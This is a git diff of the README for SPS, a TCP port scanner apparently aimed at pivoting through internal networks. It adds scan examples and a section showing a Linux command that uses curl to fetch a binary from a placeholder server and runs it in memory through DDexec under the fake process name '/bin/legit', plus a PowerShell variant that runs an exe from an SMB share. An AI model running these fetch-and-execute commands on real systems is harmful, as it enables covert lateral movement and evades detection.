@@ -1,12 +1,24 @@
 # SPS (SimplePortScanner)
 
-SPS is a simple and fast TCP port scanner, with the addition that you have the possibility to run it on any server where you can authenticate via ssh without touching disk (fileless). The process works as follows:
+SPS is a simple and fast TCP port scanner, with the addition that you have the possibility to run it on any server where you can authenticate via ssh without touching disk. 
 
-- Authentication via SSH with the provided credentials
-- Depending on the OS, a command will be executed to retrieve & execute the binary
-- After the scan, results are printed on STDOUT
+In a scenario where we want to scan hosts in an internal network through a pivot, this can help speed up the process and get more reliable results.
 
-This can speed up scan times when we have to go through multiple pivots.
+## How it works: Scanning from another machine
+
+The tool will authenticate via ssh to the host provided via the `-from` argument. After successfully authenticating, it will execute one of these commands depending on the OS provided with the `-pivot-os` argument.
+
+```bash
+# On linux
+curl http://<SERVE_IP>:<SERVE_PORT/sps.b64 | bash <(curl http://<SERVE_IP>:<SERVE_PORT>/ddexec.sh) /bin/legit -host <HOST> -port <PORTS> -retries <RETRIES> -delay-between-retries <DELAY...> -timeout <TIMEOUT>
+
+# On windows
+powershell -command "\\<SERVE_IP>\<SHARE_NAME>\sps.exe -host <HOST> -port <PORTS> -retries <RETRIES> -delay-between-retries <DELAY...> -timeout <TIMEOUT>"
+```
+
+That will download and execute the binary (in memory) and return the results in `STDOUT`. 
+
+> The linux command makes use of [DDexec](https://github.com/arget13/DDexec) in order to execute the tool in memory
 
 ## Installation / Setup
 
@@ -79,14 +91,23 @@ Usage of ./sps:
 ```
 
 ### Normal Scan
+___
+
+Here are some basic use cases:
 
 ```bash
-# Scanning all tcp ports on a host
-sps 
+# Scanning all tcp ports on 10.10.10.10
+sps -host 10.10.10.10
+
+# Scanning ports 22 and 80 on 10.10.10.10
+sps -host 10.10.10.10 -port 22,80
+
+# Scanning all tcp port on all live hosts in 10.10.10.0/24
+sps -host 10.10.10.0/24
 ```
 
 ### Scanning from another machine
-
+___
 First, you'll need to setup either a webserver or a smbshare depending on the os of the machine:
 
 ```bash
